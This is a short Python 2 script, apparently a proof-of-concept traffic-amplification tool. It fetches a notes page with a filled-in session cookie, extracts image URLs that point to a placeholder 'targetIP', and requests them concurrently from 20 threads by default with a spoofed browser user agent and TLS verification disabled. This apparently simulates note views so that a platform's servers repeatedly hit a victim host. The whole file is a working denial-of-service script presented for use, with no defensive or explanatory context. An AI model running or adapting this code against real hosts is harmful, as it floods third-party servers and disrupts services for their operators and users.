import urllib
import subprocess
import re
import time
import random
import threading
import sys
import Queue

#Simulate Note viewing

pattern =  "targetIP"
inputurl = ""

cookie = "datr=fill-me; lu=fill-me; ...fill-me...."
curl = "/usr/bin/curl"

url_dict = {}
queue = Queue.Queue()

class ThreadUrl(threading.Thread):
 
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            host = self.queue.get()
 
            proc = subprocess.Popen([curl,'--insecure','--user-agent','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2','--location','-s',host],shell=False,stdin=None,stderr=None,stdout=None)
            proc.communicate()
            print host
       
            self.queue.task_done()



if __name__ == "__main__":
    
    maxthread = 20
    if len(sys.argv) > 2:
        maxthread = int(sys.argv[2].strip())
        
    inputurl = sys.argv[1].strip()

    proc = subprocess.Popen([curl,'--insecure','--user-agent','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2','--cookie',cookie,'--location','-s',inputurl],shell=False, stdout=subprocess.PIPE)
    html = proc.communicate()[0]

    m = re.findall(r'<img class="img" src="(.*?)" />',html,re.DOTALL | re.IGNORECASE)
    for d in m:
        if pattern in d:
            u = d.replace("&amp;","&")
            url_dict[u] = 1
            
    for i in range(maxthread):
        t = ThreadUrl(queue)
        t.setDaemon(True)
        t.start()

    for host in url_dict.keys():
        queue.put(host)

    queue.join()
